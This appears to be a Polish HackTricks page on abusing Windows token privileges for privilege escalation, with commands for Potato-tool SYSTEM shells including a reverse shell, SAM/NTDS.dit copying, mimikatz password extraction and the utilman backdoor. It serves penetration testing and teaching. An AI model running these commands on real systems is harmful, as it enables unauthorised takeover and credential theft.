# Nadużywanie tokenów

{{#include ../../banners/hacktricks-training.md}}

## Tokeny

Jeśli **nie wiesz, czym są Windows Access Tokens**, przeczytaj tę stronę przed kontynuowaniem:


{{#ref}}
access-tokens.md
{{#endref}}

**Możesz być w stanie eskalować uprawnienia, nadużywając tokenów, które już posiadasz.**

### SeImpersonatePrivilege

To uprawnienie pozwala procesowi podszywać się pod inny proces (ale nie tworzyć tokenów), gdy może uzyskać uchwyt do danego tokenu. Uprzywilejowany token można pozyskać z usługi Windows (DCOM), nakłaniając ją do przeprowadzenia uwierzytelniania NTLM względem exploita, co następnie umożliwia uruchomienie procesu z uprawnieniami SYSTEM.<sup>[[2]](#references)</sup> Ten mechanizm można wykorzystać za pomocą narzędzi takich jak [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (wymaga wyłączenia WinRM), [SweetPotato](https://github.com/CCob/SweetPotato) i [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Aplikacja webowa nasłuchująca wyłącznie na loopback może być osobnym tropem prowadzącym do wymuszenia uwierzytelnienia, jeśli użytkownik lokalny może uzyskać dostęp do uwierzytelnionego endpointu, który wysyła żądanie pod wskazany przez wywołującego URL, używając tożsamości o wyższych uprawnieniach. Sprawdź autoryzację endpointu i ograniczenia dotyczące URL-i, faktyczną tożsamość klienta wysyłającego żądanie oraz sposób uwierzytelniania, a także to, czy ten klient może połączyć się z listenerem kontrolowanym przez użytkownika o niższych uprawnieniach. Samo włączone `SeImpersonatePrivilege`, listener IIS ani parametr pobierania URL-a nie potwierdzają istnienia uprzywilejowanego tokenu ani ścieżki eskalacji. Podczas enumeracji ogranicz się do pasywnego przeglądu; nie wysyłaj żądań wymuszających uwierzytelnienie. Zobacz dokumentację Microsoft dotyczącą [podszywania się pod klienta](https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation) i [tożsamości puli aplikacji IIS](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities).

Współczesne notatki dla operatorów:

- **JuicyPotato to przestarzałe narzędzie**: w Windows 10 1809+/Server 2019+ lepiej użyć **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** lub **PrintSpoofer**, zależnie od tego, która powierzchnia RPC/COM jest nadal dostępna.
- Jeśli przejęto usługę działającą jako **`LOCAL SERVICE`** lub **`NETWORK SERVICE`**, a `whoami /priv` pokazuje **filtrowany token** bez `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, najpierw odzyskaj **domyślny zestaw uprawnień** tego konta (na przykład za pomocą **FullPowers**), a następnie ponownie wypróbuj narzędzia z rodziny potato.<sup>[[3]](#references)</sup>
- Niektóre nowsze forki są wygodniejsze w użyciu niż oryginalne narzędzia. Na przykład **SigmaPotato** umożliwia refleksję i wykonywanie w pamięci oraz obsługuje nowsze wersje Windows, natomiast **PrintNotifyPotato** nadużywa usługi COM PrintNotify i często przydaje się, gdy klasyczna ścieżka przez Spooler jest wyłączona.

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Jest bardzo podobne do **SeImpersonatePrivilege** — używa **tej samej metody**, aby uzyskać uprzywilejowany token.\
Następnie to uprawnienie pozwala **przypisać token podstawowy** nowemu lub wstrzymanemu procesowi. Za pomocą uprzywilejowanego tokenu personifikacji można utworzyć token podstawowy (DuplicateTokenEx).\
Mając token, można utworzyć **nowy proces** za pomocą 'CreateProcessAsUser' albo utworzyć wstrzymany proces i **ustawić token** (zazwyczaj nie można zmodyfikować tokenu podstawowego działającego procesu).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Jeśli ten token jest włączony, można użyć **KERB_S4U_LOGON**, aby uzyskać **token personifikacji** dowolnego innego użytkownika bez znajomości poświadczeń, **dodać dowolną grupę** (administratorów) do tokenu, ustawić **poziom integralności** tokenu na "**medium**" i przypisać ten token do **bieżącego wątku** (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

To uprawnienie sprawia, że system **przyznaje pełne prawa dostępu do odczytu** do dowolnego pliku (ograniczone do operacji odczytu). Służy ono do **odczytywania hashy haseł lokalnych kont Administratora** z rejestru. Następnie można użyć narzędzi takich jak "**psexec**" lub "**wmiexec**" wraz z hashem (technika Pass-the-Hash). Ta technika nie zadziała jednak w dwóch przypadkach: gdy lokalne konto Administratora jest wyłączone lub gdy obowiązuje zasada odbierająca uprawnienia administracyjne lokalnym administratorom łączącym się zdalnie.<sup>[[2]](#references)</sup>\
W praktyce najbardziej niezawodny, zwykle wbudowany sposób działania to **VSS + `robocopy /b`**: utworzenie/udostępnienie kopii w tle, a następnie skopiowanie `SAM`/`SYSTEM` lub `NTDS.dit` w **trybie kopii zapasowej**, który omija ACL plików.<sup>[[4]](#references)</sup>

```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```

Możesz **nadużyć tego uprawnienia** za pomocą:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- śledząc **IppSec**: [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Lub zgodnie z opisem w sekcji **eskalacja uprawnień za pomocą Backup Operators** w:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

To uprawnienie zapewnia **dostęp do zapisu** do dowolnego pliku systemowego, niezależnie od jego Access Control List (ACL). Otwiera wiele możliwości eskalacji, w tym możliwość **modyfikowania usług**, przeprowadzania DLL Hijacking oraz ustawiania **debuggerów** za pomocą Image File Execution Options, a także stosowania wielu innych technik.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege to potężne uprawnienie, szczególnie przydatne, gdy użytkownik może podszywać się pod tokeny, ale również wtedy, gdy nie ma SeImpersonatePrivilege. Ta możliwość zależy od możliwości podszycia się pod token reprezentujący tego samego użytkownika, którego poziom integralności nie przekracza poziomu integralności bieżącego procesu.<sup>[[2]](#references)</sup>

**Najważniejsze informacje:**

- **Podszywanie się bez SeImpersonatePrivilege:** W określonych warunkach można wykorzystać SeCreateTokenPrivilege do EoP poprzez podszywanie się pod tokeny.
- **Warunki podszywania się pod token:** Aby podszywanie się powiodło, token docelowy musi należeć do tego samego użytkownika, a jego poziom integralności musi być niższy lub równy poziomowi integralności procesu próbującego się pod niego podszyć.
- **Tworzenie i modyfikowanie tokenów personifikacji:** Użytkownicy mogą utworzyć token personifikacji i rozszerzyć jego uprawnienia, dodając SID (Security Identifier) uprzywilejowanej grupy.

### SeLoadDriverPrivilege

To uprawnienie pozwala procesowi **ładować i wyładowywać sterowniki urządzeń** poprzez utworzenie wpisu rejestru z określonymi wartościami `ImagePath` i `Type`. Ponieważ bezpośredni dostęp do zapisu w `HKLM` (HKEY_LOCAL_MACHINE) jest ograniczony, można zamiast tego użyć `HKCU` (HKEY_CURRENT_USER). Wymagana jest jednak określona ścieżka, aby jądro rozpoznało wpis `HKCU` jako konfigurację sterownika.<sup>[[2]](#references)</sup>

Współczesne zastosowania ofensywne zwykle wykorzystują **BYOVD** (bring your own vulnerable driver): ładują **podpisany, ale podatny na ataki** sterownik jądra, a następnie używają jego IOCTL-i, aby wyłączyć zabezpieczenia lub uzyskać wykonanie kodu w jądrze. Pamiętaj, że w nowszych kompilacjach Windows 11/Server **lista zablokowanych podatnych sterowników Microsoftu** i/lub **HVCI/Memory Integrity** często uniemożliwiają działanie starszych publicznych chainów, dlatego klasyczne przykłady w stylu `szkg64.sys` nie są już niezawodne we wszystkich przypadkach.

Ta ścieżka to `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, gdzie `<RID>` to Relative Identifier bieżącego użytkownika. W `HKCU` należy utworzyć całą tę ścieżkę i ustawić dwie wartości:<sup>[[2]](#references)</sup>

- `ImagePath`, czyli ścieżkę do pliku binarnego, który ma zostać wykonany
- `Type` o wartości `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Kolejne kroki:**

1. Użyj `HKCU` zamiast `HKLM` ze względu na ograniczony dostęp do zapisu.
2. Utwórz w `HKCU` ścieżkę `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, gdzie `<RID>` oznacza Relative Identifier bieżącego użytkownika.
3. Ustaw `ImagePath` na ścieżkę do pliku binarnego.
4. Ustaw `Type` na `SERVICE_KERNEL_DRIVER` (`0x00000001`).

```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```

Więcej sposobów na nadużycie tego uprawnienia znajdziesz na stronie [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Działa podobnie do **SeRestorePrivilege**. Jego głównym zadaniem jest umożliwienie procesowi **przejęcia własności obiektu**, z pominięciem wymogu jawnego dostępu uznaniowego dzięki nadaniu praw dostępu WRITE_OWNER. Proces polega najpierw na przejęciu własności docelowego klucza rejestru w celu jego modyfikacji, a następnie na zmianie DACL, aby umożliwić operacje zapisu.<sup>[[2]](#references)</sup>

```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```

### SeDebugPrivilege

Ten przywilej pozwala **debugować inne procesy**, w tym odczytywać i zapisywać dane w ich pamięci. Dzięki niemu można stosować różne strategie memory injection, które pozwalają omijać większość rozwiązań antywirusowych i hostowych systemów zapobiegania włamaniom.<sup>[[2]](#references)</sup>

W nowoczesnych wersjach Windows pamiętaj, że `SeDebugPrivilege` zwykle wystarcza do otwierania **niechronionych procesów SYSTEM** i duplikowania ich tokenów, ale **nie** gwarantuje dostępu do **LSASS**. Jeśli włączono **RunAsPPL / LSA Protection**, niechronione procesy nie mogą odczytywać pamięci LSASS ani wykonywać do niego wstrzyknięć, nawet jeśli dostępne jest `SeDebugPrivilege`. W takim przypadku przejmij token z innego procesu SYSTEM, który nie jest chroniony przez PPL, albo połącz tę metodę z PPL bypass/BYOVD, zamiast zakładać, że `procdump` zadziała. Przykład kopiowania tokenu z użyciem `SeDebugPrivilege` + `SeImpersonatePrivilege` znajdziesz na [tej stronie](sedebug-+-seimpersonate-copy-token.md).

#### Zrzut pamięci

Do **zrzucenia pamięci procesu** możesz użyć [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) z pakietu [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite). Można go wykorzystać między innymi w przypadku procesu **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, który odpowiada za przechowywanie danych uwierzytelniających użytkowników po pomyślnym zalogowaniu się do systemu.

Następnie możesz załadować ten zrzut do mimikatz, aby uzyskać hasła:

```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

Wcześniej zapisany, możliwy do odczytania dump LSASS może być dostępny, nawet jeśli bieżące konto nie ma uprawnień do przechwycenia chronionego procesu na żywo. Traktuj plik dumpa lub archiwum o podobnej nazwie wyłącznie jako trop: sprawdź dostęp i zawartość, a następnie oceń, czy odzyskane dane uwierzytelniające są nadal ważne i zapewniają kontekst z wyższymi uprawnieniami. Sama nazwa pliku nie dowodzi, że archiwum zawiera dump ani że dane uwierzytelniające można ponownie wykorzystać.

#### RCE

Jeśli chcesz uzyskać powłokę `NT SYSTEM`, możesz użyć:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)

```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```

### SeManageVolumePrivilege

To uprawnienie (Wykonywanie zadań związanych z konserwacją woluminów) może umożliwiać uprzywilejowane operacje na woluminach, ale samo w sobie nie gwarantuje możliwości uzyskania uchwytu do woluminu w trybie surowym ani dostępu do dowolnych plików. Nadal mają znaczenie listy ACL urządzeń, stan tokena, wersja Windows i żądana operacja. Dozwolona operacja sterowania woluminem może zamiast tego zmienić listy ACL systemu plików; jest to działanie modyfikujące, które może wpłynąć na cały wolumin. Na hoście CA nadużycie certyfikatu wymaga również dostępu do użytecznego materiału klucza prywatnego, a dostęp do plików chronionych przez EFS nadal wymaga autoryzowanego klucza deszyfrującego lub odzyskiwania. Szczegółowe wymagania wstępne opisano poniżej.<sup>[[5]](#references)</sup>

Zobacz szczegółowe techniki i środki zaradcze:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Sprawdzanie uprawnień

```
whoami /priv
```

The **tokens oznaczone jako Disabled** można zazwyczaj włączyć, więc często można nadużywać zarówno uprawnień _Enabled_, jak i _Disabled_.

### Włącz wszystkie tokeny

Jeśli masz wyłączone uprawnienia, możesz użyć skryptu [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1), aby włączyć wszystkie tokeny:

```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```

Lub **skrypt** osadzony w tym [**poście**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Tabela

Pełna ściągawka dotycząca uprawnień tokenów znajduje się pod adresem [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin). Poniższe podsumowanie zawiera tylko bezpośrednie sposoby wykorzystania danego uprawnienia do uzyskania sesji administratora lub odczytu poufnych plików.<sup>[[1]](#references)</sup>

| Uprawnienie               | Wpływ       | Narzędzie              | Sposób wykonania                                                                                                                                                                                                                                                                                                                                     | Uwagi                                                                                                                                                                                                                                                                                                                        |
| ------------------------- | ----------- | ---------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Administrator**_ | narzędzie firm trzecich | _„Pozwala użytkownikowi podszywać się pod tokeny i uzyskać eskalację uprawnień do systemu NT za pomocą narzędzi takich jak potato.exe, rottenpotato.exe i juicypotato.exe”_                                                                                                                                                                              | Podziękowania dla [Aurélien Chalot](https://twitter.com/Defte_) za aktualizację. Wkrótce spróbuję opisać to w formie bardziej przypominającej przepis.                                                                                                                                                                                         |
| **`SeBackup`**             | **Zagrożenie** | _**Wbudowane polecenia**_ | Odczyt poufnych plików za pomocą `robocopy /b` lub dedykowanych narzędzi do kopiowania obsługujących SeBackup.                                                                                                                                                                                                                                                                 | <p>- Przydatne do kopiowania `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, a czasem `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` jest wygodny, ale dedykowane cmdlety/API SeBackup często zapewniają większą elastyczność w przypadku zablokowanych/otwartych plików.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Administrator**_ | narzędzie firm trzecich | Utworzenie dowolnego tokena, w tym z lokalnymi uprawnieniami administratora, za pomocą `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Administrator**_ | **PowerShell**          | Powielenie tokena SYSTEM, który nie jest **PPL**, lub zrzucenie pamięci niezabezpieczonego procesu.                                                                                                                                                                                                                                                                 | <p>Zrzucanie LSASS jest zwykle blokowane, jeśli włączono RunAsPPL/LSA Protection.</p><p>Skrypt dostępny w repozytorium [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Administrator**_ | narzędzie firm trzecich | Użycie **rodziny Potato** / podszywania się przez named pipe do uruchomienia procesu jako SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato` itd.).                                                                                                                                                                                    | <p>Najbardziej praktyczne w przypadku kont usług, takich jak IIS APPPOOL, MSSQL, zadań harmonogramu lub dowolnego kontekstu, który ma już `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Administrator**_ | narzędzie firm trzecich | <p>1. Załadowanie podpisanego, ale podatnego sterownika jądra (BYOVD)<br>2. Użycie IOCTL sterownika w celu uzyskania dostępu do odczytu/zapisu w jądrze, wyłączenia narzędzi bezpieczeństwa lub eskalacji uprawnień do SYSTEM<br><br>Alternatywnie, to uprawnienie może posłużyć do wyładowania sterowników związanych z bezpieczeństwem za pomocą wbudowanego polecenia <code>fltMC</code>, np. <code>fltMC sysmondrv</code></p>                     | <p>Starsze publicznie dostępne sterowniki, takie jak <code>szkg64.sys</code>, są coraz częściej blokowane we współczesnym Windows przez listę blokowanych podatnych sterowników / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Administrator**_ | **PowerShell**          | <p>1. Uruchomienie PowerShell/ISE z dostępnym uprawnieniem SeRestore.<br>2. Włączenie uprawnienia za pomocą <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Zmiana nazwy utilman.exe na utilman.old<br>4. Zmiana nazwy cmd.exe na utilman.exe<br>5. Zablokowanie konsoli i naciśnięcie Win+U</p> | <p>Atak może zostać wykryty przez niektóre programy AV.</p><p>Alternatywna metoda polega na zastąpieniu plików binarnych usług znajdujących się w „Program Files” przy użyciu tego samego uprawnienia</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Administrator**_ | _**Wbudowane polecenia**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Zmiana nazwy cmd.exe na utilman.exe<br>4. Zablokowanie konsoli i naciśnięcie Win+U</p>                                                                                                                                       | <p>Atak może zostać wykryty przez niektóre programy AV.</p><p>Alternatywna metoda polega na zastąpieniu plików binarnych usług znajdujących się w „Program Files” przy użyciu tego samego uprawnienia.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Administrator**_ | narzędzie firm trzecich | <p>Manipulowanie tokenami w celu nadania im lokalnych uprawnień administratora. Może wymagać SeImpersonate.</p><p>Do weryfikacji.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - ścieżki eskalacji uprawnień Windows do uprawnień administratora](https://github.com/gtworek/Priv2Admin)
- [2] [Nadużywanie uprawnień tokenów w celu LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Oddajcie mi moje uprawnienia! Proszę?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (`/b` tryb kopii zapasowej omija kontrole ACL plików/folderów)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Wykonywanie zadań konserwacji woluminów (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → eksfiltracja klucza CA → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
